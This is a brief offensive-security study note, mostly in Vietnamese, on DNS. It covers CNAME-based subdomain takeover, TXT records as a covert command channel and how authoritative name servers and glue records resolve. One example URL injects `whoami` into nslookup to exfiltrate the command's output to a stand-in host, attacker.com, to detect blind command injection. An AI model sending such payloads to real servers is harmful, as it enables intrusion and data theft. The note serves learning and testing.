#dns #offsec

## CNAME

CNAME is a field in zone file which instructs DNS server to get an A record from another domain name.

Ví dụ:

```plaintext
CNAME: awesome.example.com -> others.github.io
```

Khi đến trang `awesome.example.com`, DNS Server tìm đến bản ghi `awesome.example.com` và nhận được `CNAME`, sau đó DNS Server tìm tiếp `others.github.io` để lấy được bản ghi A.

Giả sử `others.github.io` đã bị xoá, tin tặc có thể gửi yêu cầu GitHub cấp cho domain cũ. Khi người dùng truy cập sẽ nhận được mã độc.

## Các bản ghi khác

- **MX** là bản ghi mail ⇒ có thể tìm CVE của server email để khai thác.
- **NS** là bản ghi name server ⇒ Authoritative DNS server.
- **TXT** là bản ghi dạng free text, người dùng có thể đưa thông tin tuỳ ý vào trường này.

Tin tặc có thể dùng bản ghi này để truyền thông tin điều khiển virus trong hệ thống mạng nội bộ (kể cả khi mạng đã chặn requests ra ngoài).

## Dùng DNS server để kiểm tra command injection

Giả sử attacker nghi ngờ server bị lỗi command injection, tuy nhiên response trả về không có kết quả câu lệnh được chạy (mặc dù có thể câu lệnh vẫn được chạy).

Attacker có thể kiểm soát authoritative name server và gửi HTTP request như sau:

```plaintext
https://commandinjection.example.com/?cmd=nslookup `whoami`.attacker.com
```

The web server will execute `whoami` and then `nslookup`. The attacker's name server will receive the request ⇒ it knows the result of the command `whoami`.

> [!note]
> Sử dụng dịch vụ của [webhook.site](https://webhook.site) để tạo DNS authoritative server

## DNS Server

Một số nhà cung cấp tên miền cho phép người dùng khai báo địa chỉ authoritative DNS Server.  
Ví dụ khi mua tên miền `awesome.com` từ GoDaddy, người dùng có thể khai báo authoritative server (`ns.awesome.com`) kèm địa chỉ IP của nó (gọi là glue record, cần thiết vì `ns.awesome.com` nằm trong chính tên miền nó phục vụ). Tại địa chỉ này, chạy ứng dụng DNS Server như BIND9. Khi một client thực hiện truy vấn DNS của `foobar.awesome.com`, chuỗi truy vấn đầy đủ (không cache) như sau:
- client gửi request đến DNS resolver (VD: cloudflare `1.1.1.1`)
- `1.1.1.1` gửi truy vấn đến root DNS server để biết địa chỉ máy chủ DNS cho `.com`
- `1.1.1.1` gửi truy vấn đến máy chủ DNS `.com` và nhận được NS của `awesome.com` là `ns.awesome.com`, kèm glue record (IP của `ns.awesome.com`).
- `1.1.1.1` gửi truy vấn đến `ns.awesome.com` để hỏi địa chỉ của `foobar.awesome.com` và nhận được địa chỉ IP của tên miền này.